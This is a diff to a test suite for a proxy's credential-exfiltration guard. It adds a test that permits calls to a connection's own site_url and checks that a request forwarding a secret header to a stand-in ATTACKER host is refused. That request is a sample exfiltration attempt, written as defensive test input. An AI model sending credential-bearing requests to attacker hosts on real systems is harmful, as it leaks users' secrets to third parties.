@@ -72,6 +72,7 @@ async function seedEndpointIntegration(
           type: "custom",
           ...policy,
           credentialFields: Object.keys(fields),
+          requiredCredentialFields: Object.keys(fields),
           delivery: envDelivery(
             Object.fromEntries(Object.keys(fields).map((f) => [f.toUpperCase(), f])),
           ),
@@ -241,6 +242,25 @@ describe("proxyCall — credential-exfiltration guard", () => {
       const up = upstream();
       await expectRefused(call(up.fetchImpl, "{{webhook_url}}"), "TVICTIM");
       expect(up.hits).toEqual([]);
+    });
+  });
+
+  // #1627: an entry rendered from a connection field is the connection's own endpoint.
+  describe("authorized_uris rendered from a connection field", () => {
+    const HEADER_SECRET = "whsec-R8";
+
+    it("allows {{site_url}}/… and refuses another host", async () => {
+      await seedEndpointIntegration(
+        ctx,
+        { site_url: ALLOWED, secret_header_value: HEADER_SECRET },
+        { authorizedUris: ["{$credential.site_url}/**"], allowAllUris: false },
+      );
+      const up = upstream();
+      const extra = { headers: { "X-Secret": "{{secret_header_value}}" } };
+      const res = await call(up.fetchImpl, "{{site_url}}/wp-json/x", extra);
+      expect(res.status).toBe(200);
+      await expectRefused(call(up.fetchImpl, `${ATTACKER}/wp-json/x`, extra), HEADER_SECRET);
+      expect(up.hits).toEqual([`${ALLOWED}/wp-json/x`]);
     });
   });
 
